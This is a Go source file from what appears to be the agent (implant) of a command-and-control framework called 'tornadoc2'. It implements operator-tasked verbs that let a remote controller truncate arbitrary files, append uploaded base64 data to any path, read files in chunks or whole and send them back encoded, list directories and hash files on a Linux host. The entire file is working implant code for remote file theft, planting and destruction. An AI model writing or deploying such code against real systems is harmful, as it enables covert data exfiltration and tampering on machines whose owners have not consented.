//go:build linux

package core

import (
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
	"tornadoc2/agent/protocol"
)

func (a *Agent) truncateVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID, Error: "truncate requires a path"}
	}
	path := t.Args[0]
	diag("[truncate] path=%q\n", path)

	f, err := os.OpenFile(path,
		os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	f.Close()
	return protocol.Result{ID: t.ID,
		Output: encodeOutput([]byte("truncated\n"))}
}
func (a *Agent) writechunkVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 2 {
		return protocol.Result{ID: t.ID,
			Error: "writechunk requires <b64_data> <remote_path>"}
	}
	data, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64: " + err.Error()}
	}
	path := t.Args[1]
	diag("[writechunk] path=%q %d bytes\n", path, len(data))

	f, err := os.OpenFile(path,
		os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	defer f.Close()

	if _, err := f.Write(data); err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID, Output: ""}
}
func (a *Agent) readChunkVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 3 {
		return protocol.Result{ID: t.ID,
			Error: "readchunk requires <path> <offset> <size>"}
	}
	path := t.Args[0]
	offset, err := strconv.ParseInt(t.Args[1], 10, 64)
	if err != nil || offset < 0 {
		return protocol.Result{ID: t.ID, Error: "invalid offset"}
	}
	size, err := strconv.ParseInt(t.Args[2], 10, 64)
	if err != nil || size <= 0 || size > 16*1024*1024 {
		return protocol.Result{ID: t.ID,
			Error: "invalid size (must be 1..16777216)"}
	}
	diag("[readchunk] path=%q offset=%d size=%d\n",
		path, offset, size)

	f, err := os.Open(path)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	defer f.Close()

	if _, err := f.Seek(offset, io.SeekStart); err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}

	buf := make([]byte, size)
	n, err := io.ReadFull(f, buf)
	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	for i := n; i < len(buf); i++ {
		buf[i] = 0
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput(buf[:n])}
}
func (a *Agent) fileSizeVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID, Error: "filesize requires a path"}
	}
	info, err := os.Stat(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	if info.IsDir() {
		return protocol.Result{ID: t.ID, Error: "path is a directory"}
	}
	diag("[filesize] path=%q size=%d\n", t.Args[0], info.Size())
	return protocol.Result{ID: t.ID, Output: encodeOutput(
		[]byte(strconv.FormatInt(info.Size(), 10)))}
}
func (a *Agent) sha256FileVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID,
			Error: "sha256file requires a path"}
	}
	diag("[sha256file] path=%q\n", t.Args[0])
	f, err := os.Open(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	defer f.Close()

	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	digest := fmt.Sprintf("%x", h.Sum(nil))
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(digest))}
}
func (a *Agent) catVerb(t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID, Error: "cat requires a path"}
	}
	diag("[cat] path=%q\n", t.Args[0])
	data, err := os.ReadFile(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput(data)}
}
func (a *Agent) lsVerb(t protocol.Task) protocol.Result {
	path := "."
	if len(t.Args) > 0 {
		path = t.Args[0]
	}
	diag("[ls] path=%q\n", path)
	entries, err := os.ReadDir(path)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	var sb strings.Builder
	for _, e := range entries {
		sb.WriteString(e.Name())
		sb.WriteByte('\n')
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(sb.String()))}
}
